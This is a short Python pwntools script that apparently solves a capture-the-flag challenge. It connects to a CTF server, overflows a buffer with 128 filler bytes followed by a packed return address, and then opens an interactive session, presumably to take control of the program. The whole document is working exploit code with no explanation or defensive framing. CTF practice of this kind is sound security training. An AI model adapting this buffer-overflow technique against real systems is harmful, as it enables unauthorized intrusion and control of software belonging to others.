from pwn import *

p = remote("ctf.j0n9hyun.xyz",3001)
payload = "a"*128
jump= 0x804849b
payload += p32(jump)
p.send(payload)
print p.recvrepeat(0.4)
p.interactive()
